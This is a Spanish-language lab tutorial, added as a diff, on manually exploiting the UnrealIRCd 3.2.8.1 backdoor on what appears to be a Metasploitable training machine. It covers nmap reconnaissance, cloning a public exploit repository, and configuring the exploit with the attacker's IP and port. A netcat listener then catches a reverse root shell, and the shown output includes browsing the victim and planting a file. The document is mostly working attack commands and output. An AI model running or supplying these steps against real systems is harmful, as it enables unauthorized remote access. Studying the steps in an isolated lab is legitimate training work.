@@ -1,0 +1,199 @@
+Explotar Vulnerabilidades de Forma Manual
+
+primero identificamos los dispositivos que estan conectados con un escaneo en nuestra propia red.
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -o 1 192.168.1.0/24 
+
+identificamos la direccion ip que vamos atacar.
+debemos hacer un scaneo de nmap para buscar las vulnerabilidades de esta maquina
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -p- -sVC -sC --open -sS -vvv -n -Pn 192.168.1.11 -oN scaneo  
+
+
+comprobamos que tengamos conectividad con la maquina victima                                                                                                
+┌──(root㉿kali)-[/home/kali]
+└─# ping -c 1 192.168.1.11  
+
+si tenemos conexion nos devuelve:
+┌──(root㉿kali)-[/home/kali]
+└─# ping -c 1 192.168.1.11  
+PING 192.168.1.11 (192.168.1.11) 56(84) bytes of data.
+64 bytes from 192.168.1.11: icmp_seq=1 ttl=64 time=6.51 ms
+
+--- 192.168.1.11 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 6.512/6.512/6.512/0.000 ms
+
+
+lo siguiente es utilizar un sploit de python para lanzar una ataque a esta 
+maquina victima y poder ganar acceso remoto
+
+
+cuando termina:
+revisamos el reporte
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat scaneo 
+
+con este hacemos un escaneocompleto de todos los puertos de la maquina victima.
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -p- -sVC -sC --open -sS -vvv -n -Pn 192.168.1.9    
+
+con este escaneo descubrimos el sistema operativo de la maquina 
+──(root㉿kali)-[/home/kali]
+└─# nmap -sV 192.168.1.11
+
+un escaneo mas especifico de los puertos es este que nos muestra la version de los servicios
+──(root㉿kali)-[/home/kali]
+└─# nmap -sV 192.168.1.11
+
+nos da una informacion como esta:
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+
+identificamos el puerto que vamos atacar en este caso tomamos este:
+6667/tcp open  irc         UnrealIRCd
+
+tenemos que tomar esa informacion e identificar las vulnerabilidades buscando en internet:
+buscamos en el navegador:
+UnrealIRCd github how to
+
+nos ubicamos en el escritorio puede ser donde queramos.
+──(root㉿kali)-[/home/kali]
+└─# cd Desktop
+
+listamos para ver los archivos.                                                                                        
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# ls
+escaneo  peligro.exe  prueba.txt.save  trampa.exe
+
+clonamos el repositorio.                                                                                          
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
+
+listamos nuevamente.
+verificamos que este descargado:
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# ls
+escaneo  peligro.exe  prueba.txt.save  trampa.exe  UnrealIRCd-3.2.8.1-Backdoor
+
+nos ubicamos en el exploit:
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# cd UnrealIRCd-3.2.8.1-Backdoor
+
+hacemos un ls:
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# ls
+exploit.py  README.md
+
+para poder ejecutar este sploit debemos darle permisos:
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# chmod +x exploit.py     
+
+cuando se concedio el permiso el archivo exploit.py debe aparecer en verde:
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# ls
+exploit.py  README.md
+
+debemos ingresar al exploit porque algunas veces nos pide que hagamos algunas modificaciones
+debemos poner tal vez una ip objetivo o la nuestra o un puerto.
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# nano exploit.py
+
+en este caso nos pide nuestra ip:
+abrimosuna nueva pestaña y ponemos:
+┌──(root㉿kali)-[/home/kali/
+└─# ifconfig
+
+copiamos la direccion ip
+192.168.1.10
+
+tambien nos pide un puerto:
+443
+
+para guardar:
+ctrl + o enter
+ctrl x
+
+antes de ejecutar el script abrimos otra pestaña y debemos ponernos en escucha
+┌──(root㉿kali)-[/home/kali]
+└─# nc -nlvp 443
+
+ponemos la direcion ip y el puerto de la maquina victima:
+┌──(root㉿kali)-[/home/kali/Desktop/UnrealIRCd-3.2.8.1-Backdoor]
+└─# ./exploit.py 192.168.1.11 6667 -payload netcat
+
+en cuanto se ejecute este exploit tendremos acceso remoto a la maquina victima
+
+en la pestaña que estamos en escucha nos va a mostrar esto:
+──(root㉿kali)-[/home/kali]
+└─# nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.1.10] from (UNKNOWN) [192.168.1.11] 36379
+
+tenemos acceso remoto 
+
+hacemos un ls:
+y nos muestra el contenido de lamaquina victima
+
+hacemos un pwd Para que nos muestre la ruta en la que nos encontramos:
+pwd
+
+para mejorar la vista y que nos aparezca el promt
+script /dev/null -c bash
+
+ya se veria de esta manera:
+root@metasploitable:/etc/unreal# 
+
+root@metasploitable:/# cd ..
+root@metasploitable:/# cd home
+root@metasploitable:/home# ls
+ftp  msfadmin  service  user
+root@metasploitable:/home# cd msfadmin
+root@metasploitable:/home/msfadmin# ls
+vulnerable
+root@metasploitable:/home/msfadmin# touch holaMiller.txt
+root@metasploitable:/home/msfadmin# ls
+holaMiller.txt  vulnerable
+root@metasploitable:/home/msfadmin# 
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
